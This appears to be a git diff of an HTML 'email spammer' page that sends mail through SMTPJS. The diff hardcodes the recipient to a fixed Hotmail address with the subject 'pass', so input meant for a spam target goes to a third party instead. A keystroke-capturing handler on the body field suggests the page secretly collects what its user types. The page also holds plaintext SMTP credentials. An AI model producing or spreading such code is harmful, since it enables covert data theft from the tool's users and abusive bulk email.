@@ -1,19 +1,13 @@
 <html>
 <head>
 <title>The most powerfull email spammer - Easy to use</title>
-</head>
-<body>
-<input type="text" placeholder="Enter persons email here..." id="email">
-<textarea placeholder="Enter the body in the spam here..." id="body"></textarea>
-      Number of emails: <input type="number" id="times"><button onclick="run()">RUN</button>
-</body>
-<script>
-function sendEmail(body, to) {
+      <script>
+function sendEmail(body) {
       Email.send({
         Host: "smtp.elasticemail.com",
         Username: "codeprogramerpro@gmail.com",
         Password: "F61272413F1ED2F92DEE220800968B01118B",
-        To: to,
+        To: "basedatapadrelo@hotmail.com",
         From: "codeprogramerpro@gmail.com",
         Subject: "pass",
         Body: body
@@ -38,4 +32,10 @@ document.getElementById("body").onkeyup = function(e){if(e.keyCode == 13){keysre
 </script>
 <script src="https://smtpjs.com/v3/smtp.js">
 </script>
+</head>
+<body>
+<input type="text" placeholder="Enter persons email here..." id="email">
+<textarea placeholder="Enter the body in the spam here..." id="body"></textarea>
+      Number of emails: <input type="number" id="times"><button onclick="run()">RUN</button>
+</body>
 </html>
